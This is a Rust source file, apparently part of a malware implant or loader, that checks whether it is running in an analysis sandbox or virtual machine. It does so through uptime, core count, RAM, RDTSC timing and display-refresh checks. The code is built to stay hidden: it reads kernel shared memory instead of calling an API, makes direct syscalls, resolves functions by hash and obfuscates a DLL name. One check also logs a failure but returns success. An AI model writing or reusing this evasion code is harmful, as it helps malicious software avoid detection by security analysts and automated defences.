/**
 * Mutli Signal Sandbox Detection
 * 
 * Performs environment cheks that are expensive or impossible for sand box to fake simultaneously
 * All checks MUST pass
 * */

use crate::core::hashes;
use crate::debug;
use crate::core::ssn_table;
use crate::core::invoke;

#[repr(C)]
struct SystemBasicInfo {
    reserved: u32,                  // 0x00
    timer_resolution: u32,          // 0x04
    page_size: u32,                 // 0x08
    number_of_physical_pages: u32,  // 0x0C
    lowest_physical_page: u32,      // 0x10
    highest_physical_page: u32,     // 0x14
    allocation_granularity: u32,    // 0x18
    min_user_address: u64,          // 0x20
    max_user_address: u64,          // 0x28
    active_processors_mask: u64,    // 0x30
    number_of_processors: u8,       // 0x38
}

pub unsafe fn is_real_environment() -> bool { unsafe {
    if !check_uptime() {
        debug!("[SANDBOX] FAIL: uptime < 10 minutes");
        return false;
    }

    if !check_cpu_cores() {
        debug!("[SANDBOX] FAIL: cores < 2");
        return false;
    }

    if !check_ram() {
        debug!("[SANDBOX] FAIL: RAM < 2GB");
        return false;
    }

    if !check_rdtsc_timing() {
        debug!("[SANDBOX] FAIL: RDTSC timing anomaly");
        return false;
    }

    if !check_display_refresh() {
        debug!("[SANDBOX] FAIL: display refresh rate anomaly");
        return false;
    }

    debug!("[SANDBOX] All checks passed");
    true
}}


/**
 * Read uptime from KUSER_SHARED_DATA.TickCountQuad (offset 0x320)
 * Fixed address 0x7FFE0000 - This is not an API call
 * */
unsafe fn check_uptime() -> bool { unsafe {
    let kuser = 0x7FFE0000 as usize as *const u8;
    
    let _tick_count = *(kuser.add(0x320) as *const u64);

    let interrupt_low = *(kuser.add(0x08) as *const u32) as u64;
    let interrupt_high = *(kuser.add(0x0C) as *const u32) as u64;
    let interrupt_time_100ns = (interrupt_high << 32) | interrupt_low;
    let uptime_ms = interrupt_time_100ns / 10000;

    debug!("[SANDBOX] Uptime: {}ms", uptime_ms);
    uptime_ms >= 600000 // 10 minutes
}}


unsafe fn check_cpu_cores() -> bool { unsafe {
    let table = ssn_table::syscall_table();
    if table.ssns.nt_query_system_information.ssn == 0 {
        debug!("[SANDBOX] FAIL: NtQuerySystemInformation not resolved — suspicious");
        return false; 
    }

    let info = query_system_basic_info();
    if info.is_none() {
        debug!("[SANDBOX] FAIL: SystemBasicInformation query failed — suspicious");
        return true;
    }

    let info = info.unwrap();
    debug!("[SANDBOX] CPU cores: {}", info.number_of_processors);
    info.number_of_processors as u32 >= 2
}}


unsafe fn check_ram() -> bool { unsafe {
    let info = query_system_basic_info();
    if info.is_none() {
        debug!("[SANDBOX] FAIL: RAM query failed — suspicious");
        return false;
    }

    let info = info.unwrap();
    let ram = info.number_of_physical_pages as u64 * info.page_size as u64;
    let ram_gb = ram / (1024 * 1024 * 1024);

    debug!("[SANDBOX] RAM: {}GB ({} pages x {} bytes)", ram_gb, info.number_of_physical_pages, info.page_size);
    ram >= 0x80000000 // 2 GB
}}


unsafe fn check_rdtsc_timing() -> bool { unsafe {
    let start: u64;
    core::arch::asm!(
        "rdtsc",
        "shl rdx, 32",
        "or rax, rdx",
        out("rax") start,
        out("rdx") _,
    );

    let mut acc: u64 = 0x12345678;
    for i in 0u64..1000 {
        acc = acc.wrapping_mul(6364136223846793005).wrapping_add(i);
        core::hint::black_box(acc);
    }

    let end: u64;
    core::arch::asm!(
        "rdtsc",
        "shl rdx, 32",
        "or rax, rdx",
        out("rax") end,
        out("rdx") _
    );

    let delta = end.wrapping_sub(start);
    debug!("[SANDBOX] RDTSC delta: {} cycles", delta);

    // If too high => VM overhead, if too low => sandbox skipping
    delta >= 100 && delta <= 10000000
}}

unsafe fn check_display_refresh() -> bool { unsafe {
    let user32_name: [u16; 11] = [
        0x0075, 0x0073, 0x0065, 0x0072, 0x0033, 0x0032, // user32
        0x002E, 0x0064, 0x006C, 0x006C, 0x0000,          // .dll\0
    ];

    let user32 = ssn_table::load_module(hashes::USER32_DLL_HASH, Some(&user32_name));
    if user32.is_null() {
        debug!("[SANDBOX] FAIL: user32.dll missing — suspicious");
        return false; 
    }

    let func_ptr = ssn_table::resolve_function(user32, hashes::ENUMDISPLAYSETTINGSW_HASH);
    if func_ptr.is_null() {
        debug!("[SANDBOX] FAIL: EnumDisplaySettingsW missing — suspicious");
        return false
    }

    type FnEnumDisplaySettingsW = unsafe extern "system" fn(
        device_name: *const u16,     // NULL = primary display
        mode_num: u32,              // ENUM_CURRENT_SETTINGS = 0xFFFFFFFF
        dev_mode: *mut u8,          // DEVMODEW buffer
    ) -> i32;

    let enum_display: FnEnumDisplaySettingsW = core::mem::transmute(func_ptr);

    let mut devmode = [0u8; 512]; // It needs 220, I used 513 for safety
    let dm_size: u16 = 220;
    devmode[0x44] = dm_size as u8;
    devmode[0x45] = (dm_size >> 8) as u8;

    let result = enum_display(core::ptr::null(), 0xFFFFFFFF, devmode.as_mut_ptr());

    if result == 0 {
        debug!("[SANDBOX] EnumDisplaySettingsW failed - no display?");
        return false;
    }

    // DEVMODEW layout (offsets for the W version):
    //   0x00: dmDeviceName[32] (64 bytes)
    //   0x40: dmSpecVersion (u16)
    //   0x42: dmDriverVersion (u16)
    //   0x44: dmSize (u16)
    //   0xA8: dmBitsPerPel (u32)
    //   0xAC: dmPelsWidth (u32)
    //   0xB0: dmPelsHeight (u32)
    //   0xB4: dmDisplayFlags (u32)
    //   0xB8: dmDisplayFrequency (u32) <<--
    let refresh = u32::from_le_bytes([devmode[0xB8], devmode[0xB9], devmode[0xBA], devmode[0xBB]]);
    debug!("[SANDBOX] Display refresh rate: {}HZ", refresh);

    refresh > 0
}}

unsafe fn query_system_basic_info() -> Option<SystemBasicInfo> { unsafe {
    let table = ssn_table::syscall_table();
    if table.ssns.nt_query_system_information.ssn == 0 {
        return None;
    }

    let mut info = core::mem::MaybeUninit::<SystemBasicInfo>::zeroed();
    let mut return_len: u32 = 0;

    let status = invoke::syscall4(
        table.ssns.nt_query_system_information.ssn, 
        table.ssns.nt_query_system_information.syscall_addr as usize, 
        0, // SystemBasicInformation
        info.as_mut_ptr() as usize, 
        core::mem::size_of::<SystemBasicInfo>() as usize, 
        &mut return_len as *mut u32 as usize,
    );

    if status != 0 {
        debug!("[SANDBOX] NtQuerySystemInformation faild: 0x{:08x}", status);
        return None;
    }

    Some(info.assume_init())
}}